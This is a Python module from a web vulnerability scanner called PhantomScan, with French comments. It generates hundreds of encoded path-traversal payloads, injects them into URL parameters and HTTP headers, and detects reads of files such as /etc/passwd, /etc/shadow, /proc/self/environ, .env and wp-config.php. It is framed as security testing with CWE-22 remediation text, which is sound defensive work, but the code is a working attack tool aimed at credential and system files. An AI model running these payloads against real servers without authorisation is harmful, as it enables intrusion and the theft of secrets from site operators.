"""
PhantomScan — Path Traversal Scanner (v5.5)
===========================================
Path traversal / directory traversal avancé :

Payloads couverts :
  - Traversal classique (../../)
  - Simple encodage URL (%2e%2e%2f)
  - Double encodage (%252e%252e%252f)
  - Triple encodage (%25252e...)
  - Unicode / UTF-8 overlong (%c0%af, %c1%9c, %e0%80%af)
  - Null byte (%00, %00.jpg, %00.php)
  - Mixed slashes (..\ , ..\/)
  - UNC Windows (\\server\share)
  - Strip-slash bypass (....// , ....//)
  - 16-bit Unicode Windows (%u002e)
  - Variation de profondeur : 3, 5, 7, 10 niveaux

Paramètres testés :
  - Query string (GET + POST form + JSON)
  - Path segments
  - Cookies portant des noms suspects (file, path, page...)
  - Headers (X-File-Path, X-Forwarded-Path...)

Cibles :
  - Unix : /etc/passwd, /etc/hosts, /proc/self/environ, /etc/shadow...
  - Windows : win.ini, system.ini, boot.ini, SAM...
  - App-specific : ../config.php, ../web.config, ../.env, ../wp-config.php...

Detection :
  - Pattern matching dans la réponse (signature fichier)
  - Baseline diff (variation taille > seuil)
  - Comparaison status codes
"""

from __future__ import annotations

import asyncio
import re
from itertools import product
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ── Cibles ────────────────────────────────────────────────────────────────────

TRAVERSAL_TARGETS: list[tuple[str, re.Pattern, Severity]] = [
    # Unix system files
    ("/etc/passwd",
     re.compile(r"root:.*:/bin/(?:bash|sh|nologin|false)", re.S),
     Severity.CRITICAL),

    ("/etc/shadow",
     re.compile(r"root:\$[0-9a-z]+\$", re.S),
     Severity.CRITICAL),

    ("/etc/hosts",
     re.compile(r"127\.0\.0\.1\s+localhost", re.I),
     Severity.HIGH),

    ("/proc/self/environ",
     re.compile(r"PATH=|HOME=|USER=", re.I),
     Severity.CRITICAL),

    ("/proc/self/cmdline",
     re.compile(r"python|java|php|ruby|node", re.I),
     Severity.HIGH),

    ("/etc/apache2/apache2.conf",
     re.compile(r"ServerRoot|DocumentRoot", re.I),
     Severity.HIGH),

    ("/etc/nginx/nginx.conf",
     re.compile(r"worker_processes|http\s*\{", re.I),
     Severity.HIGH),

    # Windows system files
    ("/windows/win.ini",
     re.compile(r"\[fonts\]", re.I),
     Severity.CRITICAL),

    ("/windows/system32/drivers/etc/hosts",
     re.compile(r"127\.0\.0\.1\s+localhost", re.I),
     Severity.HIGH),

    ("/boot.ini",
     re.compile(r"\[boot loader\]", re.I),
     Severity.CRITICAL),

    # App config files
    ("/.env",
     re.compile(r"(DB_PASSWORD|SECRET_KEY|APP_KEY|DATABASE_URL)\s*=", re.I),
     Severity.CRITICAL),

    ("/web.config",
     re.compile(r"connectionStrings|appSettings", re.I),
     Severity.CRITICAL),

    ("/config.php",
     re.compile(r"\$db_|define\s*\(\s*['\"]DB_", re.I),
     Severity.CRITICAL),

    ("/wp-config.php",
     re.compile(r"DB_NAME|DB_PASSWORD|table_prefix", re.I),
     Severity.CRITICAL),

    ("/.git/config",
     re.compile(r"\[core\]|\[remote", re.I),
     Severity.HIGH),
]

# ── Noms de paramètres suspects ───────────────────────────────────────────────

TRAVERSAL_PARAMS: list[str] = [
    "file", "path", "page", "doc", "document", "folder", "root",
    "dir", "download", "f", "p", "filename", "filepath", "include",
    "require", "load", "read", "view", "show", "template", "theme",
    "module", "content", "cat", "action", "url", "src", "source",
    "data", "lang", "locale", "img", "image", "name", "resource",
]

# ── Headers suspects ──────────────────────────────────────────────────────────

TRAVERSAL_HEADERS: list[str] = [
    "X-File-Path",
    "X-Forwarded-Path",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Filepath",
    "X-Custom-Path",
    "Destination",
]


# ── Génération payloads ───────────────────────────────────────────────────────

def _generate_traversal_payloads(target_file: str, max_depth: int = 10) -> list[str]:
    """Génère tous les variants de traversal pour un fichier cible."""
    payloads: list[str] = []
    seen: set[str] = set()

    # Encodings de base pour ../
    dot_dot_slash_variants = [
        "../",
        "..%2f",
        "%2e%2e/",
        "%2e%2e%2f",
        "..%252f",        # double encodage
        "%252e%252e%252f", # double encodage full
        "%c0%af..%c0%af",  # UTF-8 overlong (slash)
        "..%c0%af",
        "..%c1%9c",       # Windows backslash overlong
        "..\\",
        "..%5c",          # backslash encodé
        "..%255c",        # double-encodé backslash
        "....//",         # strip-slash bypass
        "....//"
        "..;/",           # Java Tomcat bypass
        ".%00./",         # null byte dans les dots
        "%u002e%u002e/",  # UTF-16 IE
        "%u002e%u002e%u2215",  # UTF-16 slash
    ]

    for depth in (3, 5, 7, 10):
        if depth > max_depth:
            continue
        for variant in dot_dot_slash_variants:
            prefix = variant * depth
            payload = prefix + target_file.lstrip("/")
            # Null byte suffix
            for suffix in ("", "%00", "%00.jpg", "%00.php", "\x00"):
                full = payload + suffix
                if full not in seen:
                    seen.add(full)
                    payloads.append(full)

    # Encodage complet URI du payload ../../../etc/passwd
    for depth in (3, 5):
        raw = "../" * depth + target_file.lstrip("/")
        double_enc = raw.replace(".", "%252e").replace("/", "%252f")
        if double_enc not in seen:
            seen.add(double_enc)
            payloads.append(double_enc)
        triple_enc = raw.replace(".", "%25252e").replace("/", "%25252f")
        if triple_enc not in seen:
            seen.add(triple_enc)
            payloads.append(triple_enc)

    return payloads


# ── Scanner ───────────────────────────────────────────────────────────────────

class PathTraversalScanner(ScannerMixin):

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg
        self._depth = getattr(cfg.scan, "lfi_depth", 3)

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query)

        # Aucun paramètre → tester des paramètres courants synthétiques
        test_params = list(params.keys()) or TRAVERSAL_PARAMS[:5]

        for file_path, pattern, severity in TRAVERSAL_TARGETS:
            payloads = _generate_traversal_payloads(file_path, max_depth=self._depth * 3)
            # Limiter pour ne pas flood
            payloads = payloads[:40]

            for param in test_params:
                result = await self._test_param(
                    target, parsed, param, payloads, pattern, severity, file_path
                )
                if result:
                    yield result
                    break  # un finding par fichier suffit

                await asyncio.sleep(0.05)

            # Header injection
            header_result = await self._test_headers(
                target, payloads, pattern, severity, file_path
            )
            if header_result:
                yield header_result

    # ── Test paramètre GET ────────────────────────────────────────────────────

    async def _test_param(
        self,
        target: str,
        parsed,
        param: str,
        payloads: list[str],
        pattern: re.Pattern,
        severity: Severity,
        file_path: str,
    ) -> Finding | None:
        # Baseline
        baseline_body = await self._get_body(target)

        for payload in payloads:
            url = self._inject_param(parsed, param, payload)
            body = await self._get_body(url)
            if body is None:
                continue

            if pattern.search(body):
                return Finding(
                    title=f"Path Traversal — {file_path}",
                    severity=severity,
                    url=url,
                    module="PathTraversalScanner",
                    description=(
                        f"Lecture du fichier '{file_path}' possible via traversal "
                        f"sur le paramètre '{param}'. Payload : {payload[:80]}"
                    ),
                    evidence=self._excerpt(body, pattern),
                    remediation=(
                        "Valider et normaliser tous les chemins de fichiers. "
                        "Utiliser realpath() et vérifier que le chemin résolu "
                        "reste dans le répertoire autorisé (chroot/sandbox). "
                        "Ne jamais passer de chemins fournis par l'utilisateur "
                        "directement à des fonctions de lecture de fichiers."
                    ),
                    cwe="CWE-22",
                    cvss=7.5 if severity == Severity.HIGH else 9.1,
                )

        # Baseline diff pour détecter une inclusion sans signature claire
        if baseline_body is not None:
            for payload in payloads[:10]:
                url = self._inject_param(parsed, param, payload)
                body = await self._get_body(url)
                if body and baseline_body:
                    ratio = len(body) / max(len(baseline_body), 1)
                    # Seuils adaptés aux pages dynamiques pour éviter les FP
                    # (variation naturelle de taille due aux tokens, timestamps…)
                    bl = self._heuristic.baseline
                    ratio_high = 3.5 if (bl and bl.is_dynamic) else 2.5
                    ratio_low  = 0.15 if (bl and bl.is_dynamic) else 0.20
                    if ratio > ratio_high or ratio < ratio_low:
                        return Finding(
                            title=f"Path Traversal potentiel — {file_path}",
                            severity=Severity.MEDIUM,
                            url=url,
                            module="PathTraversalScanner",
                            description=(
                                f"Variation de taille de réponse significative "
                                f"(ratio {ratio:.1f}) sur le paramètre '{param}' "
                                f"avec un payload traversal — inclusion possible."
                            ),
                            evidence=f"Baseline {len(baseline_body)}B → {len(body)}B",
                            remediation=(
                                "Vérifier manuellement. Normaliser les chemins "
                                "et restreindre les inclusions à un répertoire racine."
                            ),
                            cwe="CWE-22",
                            cvss=5.3,
                        )
        return None

    async def _test_headers(
        self,
        target: str,
        payloads: list[str],
        pattern: re.Pattern,
        severity: Severity,
        file_path: str,
    ) -> Finding | None:
        for header in TRAVERSAL_HEADERS:
            for payload in payloads[:15]:
                try:
                    resp = await self._req.get(
                        ProbeRequest(
                            url=target,
                            headers={header: payload},
                        )
                    )
                    body = resp.text or ""
                    if pattern.search(body):
                        return Finding(
                            title=f"Path Traversal via header — {file_path}",
                            severity=severity,
                            url=target,
                            module="PathTraversalScanner",
                            description=(
                                f"Lecture de '{file_path}' via le header '{header}'. "
                                f"Payload : {payload[:80]}"
                            ),
                            evidence=self._excerpt(body, pattern),
                            remediation=(
                                "Ignorer ou valider strictement les headers "
                                "qui influencent des chemins de fichiers."
                            ),
                            cwe="CWE-22",
                            cvss=8.0,
                        )
                except Exception:
                    continue
                await asyncio.sleep(0.05)
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────

    async def _get_body(self, url: str) -> str | None:
        try:
            resp = await self._req.get(ProbeRequest(url=url))
            return resp.text or ""
        except Exception:
            return None

    @staticmethod
    def _inject_param(parsed, param: str, value: str) -> str:
        qs = parse_qs(parsed.query)
        qs[param] = [value]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        return urlunparse(parsed._replace(query=new_query))

    @staticmethod
    def _excerpt(body: str, pattern: re.Pattern) -> str:
        m = pattern.search(body)
        if not m:
            return body[:200]
        start = max(0, m.start() - 30)
        end   = min(len(body), m.end() + 60)
        return body[start:end].replace("\n", "\\n")
